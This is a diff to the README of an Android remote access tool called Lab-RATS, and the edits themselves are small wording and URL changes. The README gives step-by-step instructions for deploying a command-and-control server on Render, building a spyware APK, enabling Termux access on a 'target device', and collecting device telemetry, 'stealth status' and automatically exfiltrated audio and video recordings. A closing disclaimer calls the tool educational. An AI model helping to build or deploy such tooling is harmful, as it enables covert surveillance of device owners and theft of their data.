@@ -161,13 +161,12 @@ The **Terminal Tabs Built-in Shell has been overhauled** for **professional work
 - **Unrestricted Tools**: **Install** and **run Python scripts, Nmap scans, or Metasploit** from the **C2 web terminal**.
 - **Persistent Environment**: Full support for **Termux's internal storage** and **standard Linux binaries**.
 > [!NOTE]
-> **Termux Bridge Issues**: "**Termux `allow-external-apps` setting is disabled**" (Most Common).
+> **Termux Bridge Issues**: "**Termux `allow-external-apps` setting is disabled**" *(Most Common)*.
 <br>**Solution**: **On the Target Device** open **Termux and run**:
-```
+```zsh
 echo "allow-external-apps = true" >> ~/.termux/termux.properties
 termux-reload-settings
 ```
-
 ---
 
 <p align="left">
@@ -240,13 +239,13 @@ function handleRequest(e) {
 ### ✌🏻 NEW! Option 2: Tactical Node.js Backend *(Upgraded v1.6)*
 **Best for professional fleet management** and **Automatic File Exfiltration**.
 
-**Quick Deployment on Render** (https://render.com)
+**Quick Deployment on** <a href="https://render.com" target="_blank">Render.com</a> 
 
 **1. Create a new Web Service on Render** and **connect your Lab-RATS repository**.
 <br>**2. Set the Root Directory** to c2-server.
 <br>**3. Set the Build Command** to `npm install`.
 <br>**4. Set the Start Command** to `npm start`.
-<br>**5. Deploy!** Once live, **copy your Render URL** *(e.g., https://labrats-c2.onrender.com)*, then **Enter that URL into the APK-Builder when prompted** for the **C2 Webhook URL**.
+<br>**5. Deploy!** Once live, **copy your Render URL** *(e.g., `https://labrats-github.onrender.com`)*, then **Enter that URL into the APK-Builder when prompted** for the **C2 Webhook URL**.
 <details>
   <summary>📸 Click to View Render C2 Screenshot</summary>
   <br>
@@ -256,7 +255,7 @@ function handleRequest(e) {
 **Advantages of Option 2**:
 - 🌐 **Dual-Stack IP Binding**: **Full support for both IPv4 and IPv6 connections**, **enabling seamless C2 telemetry** and **reverse WebSocket tunneling** across **cellular carrier NAT64** and **dual-stack Wi-Fi networks**.
 - 📂 **Exfiltration Vault**: **Audio/Video recordings** are automatically uploaded and **stored on your server**.
-- 📡 **Live Fleet List**: A **professional dashboard** to **manage all devices in one place**, with **editable device name** for **easy device recognition** and **NEW "Quick Action" pull-down menu** to deploy some features **without directly connecting**.
+- 📡 **Live Fleet List**: A **professional dashboard** to **manage all devices in one place**, with **editable device name** for **easy device recognition** and **NEW "Quick Action" pull-down menu** to deploy features **without directly connecting**.
 - 🔄 **Dynamic Sync**: **Heartbeat reporting** ensures your **P2P links are always up-to-date**.
 
 ---
@@ -266,7 +265,7 @@ function handleRequest(e) {
  />
 </p>
 
-To **build, compile**, and **deploy Lab-RATS** or **host the C2 server**, ensure **your environment meets the following requirements**:
+To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure **your environment meets the following requirements**:
 
 ### 1. Workstation & Build Requirements: *(For Building APKs)*
 * **Java Development Kit (JDK)**: **JDK 17 or JDK 21** *(JDK 21 recommended)*.
@@ -299,7 +298,7 @@ To **build, compile**, and **deploy Lab-RATS** or **host the C2 server**, ensure
 </p>
 
 ### 1. Building the APK (on PC)
-1.  **Download the Repository**: `git clone https://github.com/KAN3C0/Lab-RATS-v1.6.git`
+1.  **Download the Repository**: `git clone https://github.com/K4N3CO/Lab-RATS-v1.6.git`
 2.  **Navigate** to: `cd /Lab-RATS-v1.6/apk-builder/`
 3.  **Execute** the **Builder**:
     *   **Mac/Linux**: `chmod +x build.sh && ./build.sh`
@@ -334,7 +333,7 @@ Once the **Target device** downloads the **APK**:
 4.  **Uplink Confirmation**: Check your **Google Sheet**. Within **5 seconds of initialization**, the **Device Make & Model, Connection Type, IP Address, Port, Active C2 Dashboard Link, Battery %, Stealth Status, Charging Status and Storage Space will appear in the log**.
 
 <details>
-  <summary>📸 Click to View Example Google Sheet Reporting</summary>
+  <summary>📸 Click to View Google Sheet Reporting</summary>
   <br><p align="center">
   <img src="https://github.com/user-attachments/assets/ad174175-eed8-46b4-bd8d-8c72895cf88a" alt="Full Web Page Screenshot" width="80%">
 </details>
@@ -401,6 +400,7 @@ https://github.com/user-attachments/assets/2ac424d5-9df6-4732-aa4e-6b486a9809a4
 </p>
 
 ### 00. Lab-RATS.apk Installed on Android Device:
+
 <details>
   <summary>📸 Click to View App Screenshot</summary>
   <br>
@@ -553,7 +553,7 @@ This tool is for **educational and authorized security testing purposes ONLY!**.
  />
 </p>
 
-**Lab-RATS-v1.6** is **Licensed** to **KAN3C0** under the [MIT License](LICENSE).
+**Lab-RATS-v1.6** is **Licensed** to **K4N3C0** under the [MIT License](LICENSE).
 
 ---
 
@@ -561,4 +561,4 @@ This tool is for **educational and authorized security testing purposes ONLY!**.
 <img src="https://img.shields.io/badge/The one's who MIND don't matter...-The one's who MATTER don't mind-cyan?style=for-the-badge&logo=maserati&logoColor=white">
 <br>
 <p align="center">
-<img src="https://img.shields.io/badge/Developed By-KAN3C0 ©2026-darkred?style=for-the-badge&logo=magisk&logoColor=white">
+<img src="https://img.shields.io/badge/Developed By-K4N3CO ©2026-darkred?style=for-the-badge&logo=magisk&logoColor=white">
